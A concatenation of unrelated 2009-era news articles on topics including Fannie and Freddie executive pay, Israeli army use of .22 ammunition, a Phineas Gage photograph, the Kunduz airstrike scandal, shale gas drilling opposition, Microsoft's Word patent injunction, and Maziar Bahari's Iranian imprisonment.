However , recently disclosed pay packages for Fannie FNM and Freddie FRE executives suggest the shares are worthless , Bose George , an analyst at Keefe , Bruyette & Woods , wrote in a note to investors .
Fannie Chief Executive Michael Williams and Freddie CEO Charles Haldeman got $ 6 million annual compensation packages , according to regulatory filings last week .
See details of their pay .
To get all that money , the companies have to meet longer - term performance targets .
But the packages do n't include any stock , despite the fact that the government 's pay czar Kenneth Feinberg has been pushing for more stock - based compensation to better align management and shareholder interests .
A portion of Williams ' and Haldeman 's compensation will come from " deferred salary , " which is cash that will be paid only if Fannie and Freddie meet performance goals set by the companies ' boards and reviewed by the Federal Housing Finance Agency , their regulator .
“ ' This reinforces our view that the common shares will eventually trade to zero . ' ” — Bose George , Keefe , Bruyette & Woods
This is supposed to replicate " stock salary " that Feinberg approved for executives at companies that benefited from huge government bailouts .
However , because of Fannie and Freddie 's " unique circumstances , " this part of their CEOs ' compensation will be in cash , the Federal Housing Finance Agency said in a Dec. 24 statement .
What makes Fannie and Freddie unique is that the companies can't issue new common stock for executive compensation without getting Treasury 's approval first .
But that probably was n't a " meaningful impediment , " KBW 's George noted .
" The more obvious reason is that the shares have no long - term value and that no executive would accept unvested shares of the companies as part of their compensation package , " the analyst said .
" This reinforces our view that the common shares will eventually trade to zero , " George concluded .
" The companies will never be able to repay the government . "

On Friday , 13 November , soldiers were documented firing 22 - caliber bullets at demonstrators during the weekly demonstration against the Separation Barrier in Ni'lin .
The shots were fired a few dozen meters from the targets , and lightly wounded two demonstrators .
The IDF Spokesperson 's Office confirmed that 22 - caliber bullets had indeed been fired .
The following Friday , 20 November , soldiers again fired live ammunition at the demonstrators , causing moderate injuries to one and lightly injuring another .

In 2001 , the then judge advocate general , Major General Menachem Finkelstein , prohibited the use of 22 - caliber bullets to disperse demonstrators .
In early 2009 , however , the army resumed its use against demonstrators in the West Bank .
B'Tselem protested the action .
In reply , Judge Advocate General Major General Avichai Mandelblit reiterated that the IDF does not classify the Ruger rifle , which fires 22 - caliber bullets , and similar weapons , as means to disperse demonstrations or public disturbances , and that the rules governing their use in Judea and Samaria are stringent , comparable to the rules for opening fire and use of live ammunition .
Since then , the army has resumed use of 22 - caliber bullets , killing at least two Palestinians in the West Bank , and wounding dozens , some of them severely .
In February of this year , ‘ Az a - Din al - Jamal , 14 , who was throwing stones with other youths , was killed .
In June , a border policeman shot ‘ Aqel Srur , 35 , in the chest at a demonstration in Ni'lin , killing him .
Following that , the army ceased using the ammunition , until 13 November .
Real - time observations by B'Tselem and video footage filmed at two demonstrations indicate that the gunfire was completely contrary to army orders .
There was no justification to use lethal weapons in these incidents .
Persons from the village were indeed throwing stones at security forces on the other side of the fence , but from a few dozen meters away .
The security forces found cover behind concrete blocks or inside shielded jeeps , so they were not in a life - threatening situation .
The security forces had other means , which cause much lesser harm , that they could easily have used to distance demonstrators from the fence , among them tear gas and an odorous liquid sprayed at demonstrators from a tanker .
Following the firing of the 22 - caliber ammunition at demonstrators on 13 November , B'Tselem wrote to the judge advocate general , demanding an investigation into the incident , and direction of commanders whose soldiers engage in dispersing demonstrations to again clarify to their troops the rules for using live ammunition during demonstrations .
B'Tselem demands that the army immediately stop using 22 - caliber ammunition in circumstances in which soldiers ' lives are not in danger , and that measures be taken against security forces who fired live ammunition in violation of regulations and caused the death and injury of civilians .
Jack and Beverly Wilgus , collectors of vintage photographs , no longer recall how they came by the 19th - century daguerreotype of a disfigured yet still - handsome man .
It was at least 30 years ago .
The photograph offered no clues as to where or precisely when it had been taken , who the man was or why he was holding a tapered rod .
But the Wilguses speculated that the rod might be a harpoon , and the man ’s closed eye and scarred brow the result of an encounter with a whale .
So over the years , as the picture rested in a display case in the couple ’s Baltimore home , they thought of the man in the daguerreotype as the battered whaler .
In December 2007 , Beverly posted a scan of the image on Flickr , the photo - sharing Web site , and titled it “ One - Eyed Man with Harpoon . ”
Soon , a whaling enthusiast e-mailed her a dissent : that is no harpoon , which suggested that the man was no whaler .
Months later , another correspondent told her that the man might be Phineas Gage and , if so , this would be the first known image of him .
Beverly , who had never heard of Gage , went online and found an astonishing tale .
In 1848 , Gage , 25 , was the foreman of a crew cutting a railroad bed in Cavendish , Vermont .
On September 13 , as he was using a tamping iron to pack explosive powder into a hole , the powder detonated .
The tamping iron — 43 inches long , 1.25 inches in diameter and weighing 13.25 pounds — shot skyward , penetrated Gage ’s left cheek , ripped into his brain and exited through his skull , landing several dozen feet away .
Though blinded in his left eye , he might not even have lost consciousness , and he remained savvy enough to tell a doctor that day , “ Here is business enough for you . ”
Gage ’s initial survival would have ensured him a measure of celebrity , but his name was etched into history by observations made by John Martyn Harlow , the doctor who treated him for a few months afterward .
Gage ’s friends found him “ no longer Gage , ” Harlow wrote .
The balance between his “ intellectual faculties and animal propensities ” seemed gone .
He could not stick to plans , uttered “ the grossest profanity ” and showed “ little deference for his fellows . ”
The railroad - construction company that employed him , which had thought him a model foreman , refused to take him back .
So Gage went to work at a stable in New Hampshire , drove coaches in Chile and eventually joined relatives in San Francisco , where he died in May 1860 , at age 36 , after a series of seizures .
In time , Gage became the most famous patient in the annals of neuroscience , because his case was the first to suggest a link between brain trauma and personality change .
In his book An Odd Kind of Fame : Stories of Phineas Gage , the University of Melbourne ’s Malcolm Macmillan writes that two - thirds of introductory psychology textbooks mention Gage .
Even today , his skull , the tamping iron and a mask of his face made while he was alive are the most sought - out items at the Warren Anatomical Museum on the Harvard Medical School campus .
Michael Spurlock , a database administrator in Missoula , Montana , happened upon the Wilgus daguerreotype on Flickr in December 2008 .
As soon as he saw the object the one - eyed man held , Spurlock knew it was not a harpoon .
Too short .
No wooden shaft .
It looked more like a tamping iron , he thought .
Instantly , a name popped into his head : Phineas Gage .
Spurlock knew the Gage story well enough to know that any photograph of him would be the first to come to light .
He knew enough , too , to be intrigued by Gage ’s appearance , if it was Gage .
Over the years , accounts of his changed character had gone far beyond Harlow ’s observations , Macmillan says , turning him into an ill - tempered , shiftless drunk .
But the man in the Flickr photogragh seemed well - dressed and confident .
It was Spurlock who told the Wilguses that the man in their daguerreotype might be Gage .
After Beverly finished her online research , she and Jack concluded that the man probably was .
She e-mailed a scan of the photograph to the Warren museum .
Eventually it reached Jack Eckert , the public - services librarian at Harvard ’s Center for the History of Medicine .
“ Such a ‘ wow ’ moment , ” Eckert recalls .
It had to be Gage , he determined .
How many mid-19th - century men with a mangled eye and scarred forehead had their portrait taken holding a metal tool ?
A tool with an inscription on it ?
The Wilguses had never noticed the inscription ; after all , the daguerreotype measures only 2.75 inches by 3.25 inches .
But a few days after receiving Spurlock ’s tip , Jack , a retired photography professor , was focusing a camera to take a picture of his photograph .
“ There ’s writing on that rod ! ” Jack said .
He could n’t read it all , but part of it seemed to say , “ through the head of Mr. Phi ... ”
In March 2009 , Jack and Beverly went to Harvard to compare their picture with Gage ’s mask and the tamping iron , which had been inscribed in Gage ’s lifetime : “ This is the bar that was shot through the head of Mr. Phinehas P. Gage , ” it reads , misspelling the name .
Harvard has not officially declared that the daguerreotype is of Gage , but Macmillan , whom the Wilguses contacted next , is quite certain .
He has also learned of another photograph , he says , kept by a descendant of Gage’s .
As for Spurlock , when he got word that his hunch was apparently correct , “ I threw open the hallway door and told my wife , ‘ I played a part in a historical discovery ! ’ ”

BERLIN , Germany —
When Karl - Theodor zu Guttenberg was handed Germany 's defense portfolio , the young , aristocratic rising star of the German political establishment knew exactly what he wanted to do with it .
Zu Guttenberg had long coveted the defense ministry , and he planned on using the post to encourage more honest public discussion about the conflict in Afghanistan .
That would be the necessary prelude to a decision about whether Germany could contribute more troops to the NATO mission
By some measures , he has been a success .
Less than two months into zu Guttenberg 's tenure , the military mission in Afghanistan has finally become the subject of serious political debate in Berlin .
It 's just not been in the way that zu Guttenberg had hoped : Germany ’s public reckoning has come by way of a scandal that threatens to ensnare the government in months of parliamentary investigation .
Pressured by the United States for more troops , Angela Merkel had originally asked for more time , pointing to an international Afghanistan conference in January as the decisive benchmark for her government .
Now , it seems that Germany 's bitter domestic fight over the Afghan mission will last well past that deadline .
The scandal concerns an aerial attack ordered by German Gen. Georg Klein on two Taliban - hijacked trucks on Sept. 4 in the northern Afghan city of Kunduz , where German troops are based .
The bombardment resulted in the deaths of dozens of civilians — a tragic result , utterly contrary to the strategy of the NATO mission .
Klein 's ill - fated battlefield decision undoubtedly deserves scrutiny , and judging by the harsh conclusions of NATO 's official investigation of the incident it seems to merit institutional censure or punishment .
But the political soul - searching that Germany has experienced in the months since the bombing go beyond those military measures .
One cabinet secretary — Frank Jung , the former defense minister — as well as the country 's highest - ranking military official , Wolfgang Schneiderhahn , have already tendered their resignations , and a parliamentary investigation threatens zu Guttenberg 's job as well .
It also promises to put Chancellor Angela Merkel on the hot seat .
The bombing 's long political echo plays against the background of a larger question that 's gone unanswered in Germany : whether the mission in Afghanistan can , and should , properly be called a " war . "
Ever since German troops first entered the country , German politicians have suggested it 's not — or at least , they 've preferred to stick to the letter of the United Nations mandate that authorized the mission , which defined it as an engagement to strengthen and provide support to the Afghan government .
Germany 's soldiers were sent to participate in an exercise of nation - building ; violence was supposed to be an expected , but incidental , aspect of the engagement .
As the years passed , and the dangers of the mission became more manifest , Germany 's politicians stuck disingenuously with the “ support and strengthening ” description .
They claimed they had no choice :
They were constrained , they would say , not for attribution , by the suffocating constraints of contemporary German history , law and culture .
The German public is one of the most pacifist in the world .
They bear not only the historic guilt for the horrors of the second world war , but also distinct memories of living at the crossroads of a potential nuclear apocalypse during the Cold War .
Policymakers in Berlin have also cited the legal restrictions on the use of the word “ war ” :
The German armed forces were anchored in the West German constitution not as a force to fight offensive wars , but strictly to defend the homeland against attack .
But , the German political establishment 's reluctance to treat Afghanistan as a “ war ” is a semantic choice with practical significance .
Foremost , there 's a greater burden placed on German soldiers .
It means they do n't gain much public recognition for their efforts , because they are rarely framed as sacrifices made in the name of national interest and security , but rather as deeds intended to fulfill international commitments .
There are operational constraints as well .
Indeed , German soldiers in Afghanistan have a card in the pocket of their uniforms that outlines their strict “ rules of engagement ” — above all , that they can only use lethal force when they or other civilians are in immediate fatal danger .
It 's a reminder that they 're always bound by the breadth of German civil law : Each time an Afghan is killed by a German soldier , the circumstances are investigated by a public prosecutor in Germany for potential criminal wrong - doing .
But , in addition to placing those stresses on their soldiers , Germany 's politicians have also inadvertently tied their own hands .
Without the moral imperative of a war being fought in the national interest , German policymakers have struggled to carve out the budget and resources the mission demands .
And Germany 's policymakers have had to consider fundamental changes in battlefield strategy in order to keep up with an enemy that does n't pay credence to their hand - wringing : Numerous unattributed reports from recent months have suggested the German military had already shifted toward a more aggressive posture in Afghanistan .
But , with the German public having been sold a humanitarian mission , those changes in policy had to be made in the shadows , not as the product of the give - and - take of open parliamentary discourse .
The current public outrage is a product of this steady , but unacknowledged drift in elite opinion .
Gen .
Klein admitted to his superiors that he had requested the aerial attack in Kunduz with the intention of killing the Taliban fighters who were in the vicinity .
Zu Guttenberg himself originally felt comfortable calling the attack “ militarily appropriate . ”
That may have rung true in the halls of Defense Ministry where the realities of the Afghan conflict have long been absorbed .
But to the public at large , zu Guttenberg 's seeming praise of the civilian casualties could come across as nothing but utterly tone deaf .
To a public that did n't know its military was ever granted authority to go on the offensive , the attack was utterly shocking .
Zu Guttenberg 's comments have served as a ripe occasion for opportunistic opposition parliamentarians who have started the public investigation into the attack and the government 's response to it .
Meanwhile , a federal prosecutor is investigating whether Klein may be culpable of war crimes — a process that could settle , once and for all , whether Germany is involved in a war in the first place .
Zu Guttenberg 's impulse upon taking office as defense minister — to close the gap between the public perception of the Afghan mission and its on - the - ground realities — may have been an honorable one .
He was certainly correct to have used openly the word “ war ” as a descriptor of the Afghan conflict , even if only to describe his soldiers ' perception of their mission .
But , it now appears that zu Guttenberg may not survive this current scandal , because he did n't realize that the fateful gap was probably too wide to have been bridged by rhetoric alone .
And Angela Merkel , who had been hoping for a productive public debate in the coming months about sending more troops to Afghanistan , will have to consider her own judgment as well : namely , whether she was naive to think she could condense into four months a task that she had neglected for the previous four years .

A protester being escorted offstage at a recent New York City hearing on drilling .
Drill baby drill does n't ring so well in New York City .
8 weird ways to save the Earth View photos Geoengineering , or deliberately tinkering with the earth 's climate , could help if global warming proves disastrous for mankind , but the ideas are untested and the risks unknown .
NEW YORK ( CNNMoney.com ) -- " Drill baby drill " is so 2008 .
More than a year after Republicans rallied around the now - famous call , a growing number of Americans are saying not - in - my - backyard when it comes to more oil and natural gas drilling .
At a recent drilling hearing in New York City the crowd was certainly riled up , but not in a way that might please Sarah Palin .
" We do n't want more hearings , we want a total statewide ban , " exclaimed one protestor , jumping on stage at the hearing 's start before being escorted away by uniformed officers .
The standing - room - only crowd , many carrying protest signs , erupted in applause .
Most Americans still support increased oil and gas drilling .
But opposition is growing , especially when that drilling nears more populated urban areas .
Currently there are natural gas booms happening around New York City , Dallas - Fort Worth , Western Colorado , the Midwest , and elsewhere .
Opponents fear this new drilling will ruin the drinking water for millions of people , among other concerns .
And energy companies , accustomed to dealing with rural populations familiar with drilling and eager for jobs and lease royalties , are increasingly finding themselves at odds with a more educated and wealthy populace wary of energy development .
This is especially true outside New York City .
Just north of America 's largest metropolis lies one of the country 's most promising new sources of energy : The Marcellus Shale .
Running much of the length of the Appalachian Mountain rage , the Marcellus is thought to hold up to 500 trillion cubic feet of natural gas - more than twice the nation 's current total reserves .
In the age of global warming , natural gas as an energy source is gaining favor .
Burned to generate electricity , it emits about half as much pollution as coal .
It can also be used to power cars , and some , including the oil billionaire T. Boone Pickens , are pushing this idea as a way of weaning the country off foreign oil .
Growing fear about contaminated water
New horizontal drilling technologies have made the gas in the Marcellus shale and other shales across the country more accessible .
But extracting it requires breaking the shale rock with a mixture of chemicals , water and sand , blasted down the well hole .
While the process , known as hydraulic fracturing , has been around for decades , it 's never been done on this scale , and so close to major population centers .
The shale lies thousands of feet below the water line , and both energy company officials and state regulators across the country say the chemicals used in the fracturing process have never resulted in ground water contamination .
But across the country a few high profile mishaps have occurred , resulting in contaminated drinking wells , flammable tap water , and even houses exploding .
Radiation , often naturally occurring in rocks , has also been found in drinking water .
Regulators from various states said the contamination is not due to chemical fracturing but to drilling or surface spills .
And while acknowledging they are unfortunate , state officials note these incidents make up only a fraction of the hundreds of thousands of wells drilled nationwide .
The federal Environmental Protection Agency has just begun looking into the issue .
EPA had been largely sidelined from regulating this practice thanks to a 2005 law exempting the drilling from the Clean Water Act and declaring the chemicals trade secrets not subject to disclosure .
" EPA is reviewing available information to determine whether hydraulic fracturing fluids have contaminated drinking water , " the agency said in a statement to CNNMoney.com .
That 's of little consolation to many New Yorkers .
" I consider it a grave threat to our resources , " said Joe Lavine , an architect from Brooklyn with a weekend house near the drilling .
" Nobody knows if [ the chemicals ] are migrating . "
So Levine helped organize a group called Damascus Citizens for Sustainability .
Named after a nearby town , its members are calling for stricter drilling regulations .
Unlike many grassroots opposition groups that are often initially unfamiliar with the nuts - and - bolts of an issue , this one has plenty of technical expertise .
It includes a former head of New York City 's water system and a Columbia - trained geophysicist .
" We 've had a great handle on this from the beginning , " said Levine .
They 've networked among other grass roots groups in New York State , traveling to Ithaca , Binghamton , and other towns dealing with increased drilling .
Levine said there are now some 50 groups in New York State alone that receive emails and get their members out to sign petitions or turn up at public hearings .
This activism likely played a part in a recent decision by Chesapeake Energy ( CHK , Fortune 500 ) , one of the country 's largest natural gas companies , to not drill on any of the land it has leased in the New York City watershed .
In a press release , the company said " the concern for drilling in the watershed has become a needless distraction from the larger issues of how we can safely and effectively develop " other gas fields in New York .
Chesapeake noted the watershed leases are just a tiny part of their overall holdings in the state , and that they were the only company holding leases in the watershed .
It seems clear that calls from activists seeking a complete state - wide ban are making energy companies nervous .
Beyond New York
The activism in New York is firing - up concerned citizens in other parts of the country .
In Fort Worth , Texas , hardly an area known for anti-drilling sentiment , Don Young said the number of people on his email list has gone from 200 to 400 in the last few months .
Young , a stained - glass artist who lives right across from a natural gas well situated next to a public park , started the blog FWCanDo five years ago .
It acts as a sort of clearing house for information on natural gas drilling .
He said many people are now signing up from the New York area , but he's also getting inquiries from Michigan , Arkansas , Ohio and elsewhere .
In Fort Worth where the Barnett Shale is located , natural gas drilling and hydraulic fracturing has been going on literally right under the city for roughly a decade .
Opposition here is getting a bit hotter , he said .
" The crowds are greater , and the hard questions are a little more frequent , " said Young , " At first it was all about the money , but now it 's about health , safety and the environment too . "
In Western Colorado , public awareness of drilling and the potential dangers has increased as wealthy people from nearby resort towns have become interested in the cause , said Theo Colborn , president of the Endocrine Disruption Exchange , a group studying the effects of drilling chemicals on humans .
Colborn recounted the story of a nearby town where the local officials were considering allowing more drilling .
Soon after , residents had their cars leafleted with pamphlets describing the associated dangers .
Turns out , a local resident had hired a public relations agency to come in and run the campaign .
" A lot of wealthy people have been affected , and they can afford the lawyers or PR firms to come in and do stuff like this , " she said .
Nationwide , few expect rising public concern to put a stop to new natural gas development .
" On balance , future regulation will likely attempt to accommodate industry in order to preserve the energy security and climate change policy benefits of expanded domestic gas production , " Robert Johnston , director of Energy & Natural Resources at the political consultancy Eurasia Group , wrote in a recent research note .
But the days of this industry operating in relative obscurity and with little federal oversight are likely numbered .
Reader Nimed sends along this short video on peer review in the climate change community :
On a more serious note , this interview with the head of the UN 's climate experts is ridiculous .
He responds to concerns about the peer review process being stacked by saying . . . all the work was peer reviewed .
I am open to being convinced that I should not care about hacked information , and I am a confirmed believer in AGW .
So why can't , or wo n't , the climate change community mount a more compelling defense ?
The US Court of Appeals has ordered Microsoft to drop support for editing Custom XML in Word , essentially stopping the company from selling current versions of one of its flagship products and affirming a $ 290 million patent infringement judgment against the software giant .
The injunction , which goes into effect on January 11 , 2010 , not only bars the sale of Word 2007 , but also affects all editions of Microsoft Office 2007 , since Word comes bundled with all of them .
It 's not as bad as it seems , however .
" This injunction applies only to copies of Microsoft Word 2007 and Microsoft Office 2007 sold in the US on or after the injunction date of January 11 , 2010 , " a Microsoft spokesperson told Ars , meaning all copies of these products sold before this date ( including Word 2003 and Word 2007 ) are not affected .
" With respect to Microsoft Word 2007 and Microsoft Office 2007 , we have been preparing for this possibility since the District Court issued its injunction in August 2009 and have put the wheels in motion to remove this little - used feature from these products .
Therefore , we expect to have copies of Microsoft Word 2007 and Office 2007 , with this feature removed , available for US sale and distribution by the injunction date . "
The injunction does not require changes to Word 2010 , slated for release in June 2010 .
This is because " the beta versions of Microsoft Word 2010 and Microsoft Office 2010 , which are available now for downloading , do not contain the technology covered by the injunction , " the Microsoft spokesperson confirmed .
A federal judge in Texas issued an injunction that gave Microsoft 60 days to stop shipping any recent version of Word , based on a patent that was found to cover the XML formatting used by the software .
A week later , Microsoft asked for a stay by filing an emergency motion .
Canadian - based i4i , the company that owns the patent that Microsoft has been found to be infringing , claimed in the lawsuit that its business shrank significantly when Microsoft added custom - XML support to Word .
Word 2003 and Word 2007 were both found to be infringing on i4i's patent by using XML for encoding and customizing XML in a specific way ( US Patent No. 5,787,449 ) .
The stay was granted in September 2009 , but it has now been lifted and Microsoft is being asked to stop selling Word as well as pay $ 290 million in penalties .
While Redmond is moving quickly to comply with the injunction , it is n't giving in completely .
" We are also considering our legal options , which could include a request for a rehearing by the Federal Circuit Court of Appeals en banc or a request for a writ of certiorari from the US Supreme Court , " the Microsoft spokesperson told Ars .
Sen .
Joe Lieberman said Sunday it 's worth defeating a healthcare overhaul in order to prevent the creation of a government - run health insurance program .
Interviewed on CBS's " Face the Nation , " the independent member of the Democratic Caucus said doing " nothing " is better than a so - called public option .
ADVERTISEMENT
" ' Nothing ' is better than getting that , " Lieberman said .
" We ought to follow the doctors ' oath and say , ' First , let 's do no harm .
'" The Connecticut lawmaker said fixing the economy and creating jobs is a higher priority than healthcare , and a government - run insurance plan would damage the economy by hiking premiums , raising taxes or increasing the national debt .
Supporters of the public option say that it would help drive down premiums and lower healthcare costs by competing with private insurance companies who often dominate their markets .
The House bill to be debated next week in the House has a public option .
Senate Majority Leader ( D - Nev. ) has indicated that he will include a public option in the Senate version , despite doubts about whether it can get enough votes to pass .
Those doubts grew last week when Lieberman announced he would join a Republican filibuster to prevent a public option .
Lieberman is one of the 60 votes that Senate leaders count on to get the 60 votes they need to end Republican filibusters .
" I 'm not going to filibuster to stop the debate on healthcare reform from beginning because I want to have that debate , " Lieberman said Sunday .
" I want to have healthcare reform .
... But I feel so strongly about the creation of another government health insurance entitlement , the government going into the health insurance business , I think it 's such a mistake that I would use the power I have as a single senator to stop a final vote . "
Supporters lashed out at Lieberman 's announcement last week , saying he was catering to the insurance companies headquartered in his state .
One liberal Democrat , Rep. Raul Grijalva ( D - Ariz . ) , tied it to the campaign contributions Lieberman has received from the industry .
Lieberman has gotten $ 2.6 million from the health sector during his time in the Senate , according to Opensecrets.com , ranking him 15th highest in Congress .
Lieberman rejected that idea Sunday , saying he filed anti-trust cases against companies when he was Connecticut attorney general and supports ending the industry 's anti-trust exemption .
" I have never hesitated to get tough on insurance companies when I thought they were wrong , " Lieberman said .
ADVERTISEMENT
He said it was his critics who insist on a public option who threaten the prospects for passing a bill .
" By having a litmus test , they 're stopping us from getting anything done , " Lieberman said .
Also Sunday , House Minority Leader ( R - Ohio ) outlined how he plans to offer an alternative healthcare proposal in the House .
He has previously said he will have an alternative and Democratic leaders have said they will allow a vote on it .
said the Congressional Budget Office is currently " scoring , " or drafting a cost estimate , for a bill that takes " eight or nine " of the principles Republicans have espoused .
" We do not increase taxes , we do not cut Medicaid or Medicare , and do not have mandates on individuals or businesses , " Boehner said on CNN 's " State of the Union . "
" I 'm hopeful that Speaker Pelosi will allow us to offer an alternative . "
House Speaker Nancy Pelosi ( D - Calif. ) has indicated she may not allow amendments by Republicans or her fellow Democrats .
But House Democratic leaders have said Republicans will get a vote on their proposal .
Asked last week if the Republican proposal will be available to the public for three days prior to the vote , as he and others have demanded for Pelosi 's bill , Boehner was noncommittal .

Current thread :
In most cases , he followed the recommendation of the parole board , but in several cases he overrode the objections of prosecutors , judges and victims ’ families .
And in several , he followed recommendations for clemency from Baptist preachers who had been longtime supporters .
Prosecutors told him he was ignoring his responsibility to explain to citizens why he was setting free convicted murderers and rapists .
His response , some of them say , was to blame others and strike out against his critics  an off - note from a man they consider a gifted politician .

“ Victims groups were pretty well ignored , along with boots - on - the - streets law enforcement and good citizens who sit on these juries , ” said Larry Jegley , who objected to Mr. Clemmons ’s clemency request as the prosecuting attorney for Pulaski County , where he was convicted .
Robert Herzfeld , then the prosecuting attorney of Saline County , wrote a letter to Governor Huckabee in January 2004 , saying his policy on clemency was “ fatally flawed ” and suggesting that he should announce specific reasons for granting clemency .
Mr. Huckabee ’s chief aide on clemency wrote back : “ The governor read your letter and laughed out loud .
He wanted me to respond to you .
I wish you success as you cut down on your caffeine consumption . ”
“ It was all a very personal issue for him , ” said Mr. Herzfeld , who later sued successfully to overturn one of Mr. Huckabee ’s clemency decisions , which would have set free a man convicted in a bludgeoning death .
“ It was always about how I was trying to get him or another prosecutor was trying to get him , not about how to do it right .
He ’s brilliant politically and very likable , but it seems like there ’s a blind spot on this issue . ”
With Mr. Clemmons , political consultants say Mr. Huckabee may have hit his Willie Horton moment
“ As a front - runner , obviously with circumstances like this , it ’s out there as a big issue , ” said Ed Rollins , the manager of Mr. Huckabee ’s 2008 presidential campaign .
As Politico ’s Laura Rozen points out , there is a remarkable moment of black comedy in the Newsweek reporter Maziar Bahari ’s personal account of his recent captivity and interrogation in Tehran ’s Evin prison .
Mr. Bahari , an Iranian - Canadian filmmaker and writer whose detention we discussed last month on The Lede , writes that during his confinement , at one point his interrogator asked him to explain his appearance in a fake news report ( embedded above ) that was filmed by Comedy Central ’s “ The Daily Show ” in the run-up to June ’s disputed presidential election .
Mr. Bahari ’s account of his 118 days in captivity offers a fascinating insight into the government ’s attempts to understand and stifle the dissent that followed the election .
It is often a harrowing read , but his description of being pressed about the meaning of his appearance on “ The Daily Show , ” in addition to being absurd , points to the apparent difficulty his interrogators had in distinguishing between the work of spies and the work of journalists .
Mr. Bahari , who calls his main interrogator “ Mr. Rosewater ” because of the cologne he wore , recalls :
I saw the flicker of a laptop monitor under my blindfold .
Then I heard someone speaking .
It was a recording of another prisoner ’s confession .
“ It ’s not that one , ” said the second interrogator .
“ It ’s the one marked ‘ Spy in coffee shop . ’ ” Mr. Rosewater fumbled with the computer .
The other man stepped in to change the DVD .
And then I heard the voice of Jon Stewart on The Daily Show .
Only a few weeks earlier , hundreds of foreign reporters had been allowed into the country in the run-up to the election .
Among them was Jason Jones , a “ correspondent ” for Stewart ’s satirical news program .
Jason interviewed me in a Tehran coffee shop , pretending to be a thick - skulled American .
He dressed like some character out of a B movie about mercenaries in the Middle East — with a checkered Palestinian kaffiyeh around his neck and dark sunglasses .
The “ interview ” was very short .
Jason asked me why Iran was evil .
I answered that Iran was not evil .
I added that , as a matter of fact , Iran and America shared many enemies and interests in common .
But the interrogators were n’t interested in what I was saying .
They were fixated on Jason .
“ Why is this American dressed like a spy , Mr. Bahari ? ” asked the new man .
“ He is pretending to be a spy .
It ’s part of a comedy show , ” I answered .
“ Tell the truth ! ” Mr. Rosewater shouted .
“ What is so funny about sitting in a coffee shop with a kaffiyeh and sunglasses ? ” “ It ’s just a joke .
Nothing serious .
It ’s stupid . ” I was getting worried .
“ I hope you are not suggesting that he is a real spy . ”
“ Can you tell us why an American journalist pretending to be a spy has chosen you to interview ? ” asked the man with the creases . …
That same satirical “ Daily Show ” report also included an interview with Muhammad Ali Abtahi , a former vice president , who was sentenced last week to six years in prison “ for crimes against internal national security , propaganda against the Islamic republic , insulting the president and creating public disorder by his presence at illegal protests , ” according to a Web site on Iran monitored by my colleague Michael Slackman .
Another of the comedy program ’s reports from Iran this summer included an interview with a young man in Tehran who said he was familiar with it , so “ The Daily Show ” is not unknown in Iran , even if the regime members who interrogated Mr. Bahari failed to see its humor .
In addition to telling his story in Newsweek , Mr. Bahari discussed his interrogation in an interview with Bob Simon on the CBS News program “ 60 Minutes . ”
That interview , which was broadcast on Sunday , is embedded below .
During the interview , Mr. Bahari screened some of the video he shot of the post-election demonstrations .
His recordings include images of protesters being shot and killed during a confrontation with members of Iran ’s Basij militia on June 15 , after the first huge post-election protest rally in Tehran .
Mr. Bahari also told CBS that his fears for his personal safety were made worse by the fact that his interrogator was so completely ignorant of his work that he described Newsweek as an intelligence service and had a strange fixation with one American state , New Jersey :
He was fascinated with New Jersey .
I think the words New Jersey sounded to him like the most American place that you can be in your life .
Because he thought of New Jersey as kind of like paradise .
To him , he had to suffer on this world in order to go to paradise — in order to drink wine and have sex with at least 72 virgins and then others if he wanted to …
He hated me and he was jealous of me at the same time , because I had been to New Jersey .
And then , I thought to myself , ‘ Maziar , you are screwed , because these guys are in charge of your life and they are stupid , they are ignorant . ’
After 118 days , Mr. Bahari was finally released after he made a forced confession , which is also shown in the “ 60 Minutes ” interview .
Having left Iran , he told CBS that he firmly believes something fundamental has changed there .
“ Since the election , ” he told Mr. Simon , “ we can say that Iran is not a clerical regime anymore , it ’s a military regime — because instead of clerics , it ’s the military , the Revolutionary Guards , who are in power . ”
( CNN ) --
A judge in Oklahoma extended on Friday a temporary restraining order on a law that would post information online about women who get abortions in the state .
In extending the restraining order , Oklahoma County District Judge Daniel Owens denied the state 's motion to dismiss the case , putting the measure on hold until a February 19 hearing .
" We are very pleased with today 's ruling .
This law is a profound intrusion on women 's privacy and a waste of taxpayers ' money , " attorney Jennifer Mondino of the Center for Reproductive Rights said in a written statement .
The New York - based center had filed a suit on behalf of former state Rep. Wanda Jo Stapleton and another Oklahoma resident .
" Women in Oklahoma should not have to jump through hoops to access legal medical care and the government has no business violating the state constitution to impose those obstacles , " Mondino said .
The law , passed in May , requires doctors to fill out a 10 - page questionnaire for every abortion performed , including asking the woman about her age , marital status , race and years of education .
In all , there are 37 questions the women are to answer .
Critics say the act would be harassment and an invasion of privacy .
State Sen . Todd Lamb helped draft the abortion legislation and describes it as " a common sense measure with bipartisan support . "
He said the left has tried to skew the law 's intent through a campaign of misinformation .
" We 're not trying to embarrass anybody , hurt anybody or make anybody 's identities known .
That 's not the purpose of the legislation , " the Republican lawmaker said .
" We want to collect hard data that can be a useful tool in helping prevent future unwanted pregnancies . "
One section of the " Individual Abortion Form " says the woman must state her reason for seeking an abortion and answer this checklist .
" Having a baby :
• Would dramatically change the life of the mother ;
• Would interfere with the education of the mother ;
• Would interfere with the job / employment / career of the mother . "
A Democratic former state legislator called the law " abusive and invasive . "
" Nosy neighbors with some effort could identify or , even worse , misidentify these women who answer these questions , " said Stapleton .
Lamb , who is running for lieutenant governor , rejects that notion .
How can it violate women 's privacy , Lamb said , if their identity is kept confidential ?
The measure specifies women 's identities will be protected .
" Nothing in the Individual Abortion Form shall contain the name , address or information specifically identifying any patient , " it says .
" Nobody 's identity will be made known , " Lamb said .
Troy Newman , the head of the Kansas - based anti-abortion group Operation Rescue , said the law is " designed so that the pregnant mother can have as much information as technology and medicine will allow . "
" Naturally , the abortion industry wants to block this , because they know the more information the mom has , the less likely she is to abort her baby , " Newman said .
The Center for Reproductive Rights argues that the measure is unconstitutional and in violation of the state 's " single subject rule " because it covers different aspects of abortion .
The law also bars women from seeking abortions solely because of the sex of the fetus , with fines up to $ 100,000 for doctors who " knowingly violate " it .
" We are very committed from keeping the law from going into effect , " Mondino said .
" The law represents a very serious invasion of women 's privacy interests . "
Lamb said he believes the law will stand .
" None of the bill is being challenged on the merits of the legislation , " he says .
Abortion rights supporters are extremely concerned about the intrusiveness of the questions , and fear that identities of women could be compromised , especially in small communities .
" It requires doctors to ask and submit answers to at least 37 intensely personal questions .
There are details in those questions about rape , incest , abuse , relationship problems and emotional health , " Stapleton said .
" I think women can be identified . "
According to state estimates , the Oklahoma State Department of Health will spend roughly $ 250,000 a year to carry out the law .
